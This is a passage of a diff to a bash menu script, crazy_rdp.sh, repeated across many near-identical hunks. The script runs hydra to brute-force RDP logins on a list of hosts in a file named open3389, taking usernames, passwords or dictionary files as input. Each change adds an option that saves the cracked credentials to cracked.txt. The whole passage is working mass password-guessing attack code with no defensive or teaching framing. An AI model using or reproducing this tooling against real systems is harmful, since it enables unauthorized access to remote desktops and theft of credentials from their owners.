 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12763,7 +12763,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12772,7 +12772,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12815,7 +12815,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12825,7 +12825,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12835,7 +12835,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12844,7 +12844,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12887,7 +12887,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12897,7 +12897,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12907,7 +12907,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12916,7 +12916,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12959,7 +12959,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12969,7 +12969,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12979,7 +12979,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -12988,7 +12988,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13031,7 +13031,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13041,7 +13041,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13051,7 +13051,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13060,7 +13060,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13103,7 +13103,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13113,7 +13113,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13123,7 +13123,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13132,7 +13132,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13176,7 +13176,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13186,7 +13186,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13196,7 +13196,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13205,7 +13205,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13249,7 +13249,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13259,7 +13259,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13269,7 +13269,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13278,7 +13278,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13321,7 +13321,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13331,7 +13331,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13341,7 +13341,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13350,7 +13350,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13393,7 +13393,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13403,7 +13403,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13413,7 +13413,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13422,7 +13422,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13465,7 +13465,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13475,7 +13475,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13485,7 +13485,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13494,7 +13494,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13538,7 +13538,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13548,7 +13548,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13558,7 +13558,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13567,7 +13567,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13610,7 +13610,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13620,7 +13620,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13630,7 +13630,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13639,7 +13639,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13683,7 +13683,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13693,7 +13693,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13703,7 +13703,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13712,7 +13712,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13756,7 +13756,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13766,7 +13766,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13776,7 +13776,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13785,7 +13785,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13828,7 +13828,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13838,7 +13838,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13848,7 +13848,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13857,7 +13857,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
